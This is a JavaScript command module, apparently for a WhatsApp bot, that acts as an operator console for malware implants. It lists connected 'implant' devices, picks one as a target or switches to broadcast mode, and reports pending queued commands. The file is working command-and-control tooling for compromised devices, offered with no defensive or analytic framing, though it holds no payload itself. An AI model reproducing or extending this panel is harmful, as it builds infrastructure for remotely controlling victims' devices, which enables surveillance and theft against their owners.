export default {
  name: 'owner',
  commands: ['devices', 'target', 'untarget', 'status', 'broadcast'],
  handler: async (ctx) => {
    const { sock, jid, cmd, args, getDevices, getTarget, setTarget, clearTarget, db } = ctx;

    switch (cmd) {
      case 'devices': {
        const devices = getDevices();
        if (!devices.length) {
          await sock.sendMessage(jid, { text: '📭 *No devices registered.*\n\nWait for an implant to connect first.' });
        } else {
          const lines = devices.map((d, i) =>
            `${i + 1}. \`${d.device_id}\` ${d.is_online ? '🟢 Online' : '🔴 Offline'}\n   Last: ${new Date(d.last_seen * 1000).toLocaleString()}`
          );
          await sock.sendMessage(jid, { text: `📱 *DEVICES (${devices.length})*\n━━━━━━━━━━━━━━━━━━━━━\n${lines.join('\n')}\n━━━━━━━━━━━━━━━━━━━━━\nUse \`!target <id>\` to select one.` });
        }
        break;
      }

      case 'target': {
        if (!args) {
          const current = getTarget(jid);
          if (current) {
            await sock.sendMessage(jid, { text: `🎯 Currently targeting: \`${current}\`\nUse \`!untarget\` for broadcast mode.\nUsage: \`!target <device_id>\`` });
          } else {
            await sock.sendMessage(jid, { text: '📢 *Broadcast mode*\nUsage: `!target <device_id>`\n\nUse `!devices` to list available devices.' });
          }
          break;
        }
        const devices = getDevices();
        const found = devices.find(d => d.device_id === args);
        if (!found) {
          await sock.sendMessage(jid, { text: `❌ Device \`${args}\` not found.\nUse \`!devices\` to see available devices.` });
          break;
        }
        setTarget(jid, args);
        await sock.sendMessage(jid, { text: `🎯 *Targeting:* \`${args}\` ${found.is_online ? '🟢' : '🔴'}\nAll commands will be sent to this device.` });
        break;
      }

      case 'untarget':
        clearTarget(jid);
        await sock.sendMessage(jid, { text: '📢 *Broadcast mode activated*\nCommands will be sent to ALL devices.' });
        break;

      case 'status': {
        const count = db.exec("SELECT COUNT(*) as c FROM devices")[0]?.values[0]?.[0] || 0;
        const online = db.exec("SELECT COUNT(*) as c FROM devices WHERE is_online=1")[0]?.values[0]?.[0] || 0;
        const pending = db.exec("SELECT COUNT(*) as c FROM command_queue WHERE delivered=0")[0]?.values[0]?.[0] || 0;
        const target = getTarget(jid);
        await sock.sendMessage(jid, {
          text: `╔══════════════════════╗\n║   📊 *BOT STATUS*    ║\n╚══════════════════════╝\n\n🤖 Bot: 🟢 Online\n📱 Devices: ${count} (${online} online)\n⏳ Pending: ${pending}\n⏱ Uptime: ${Math.floor(process.uptime())}s\n🎯 Target: ${target || '📢 Broadcast'}\n━━━━━━━━━━━━━━━━━━━━━`
        });
        break;
      }

      case 'broadcast': {
        const devices = getDevices();
        if (!devices.length) {
          await sock.sendMessage(jid, { text: '❌ No devices to broadcast to.' });
          break;
        }
        clearTarget(jid);
        await sock.sendMessage(jid, { text: `📢 *Broadcast mode*\nYour next command will go to ${devices.length} devices.` });
        break;
      }
    }
  }
};
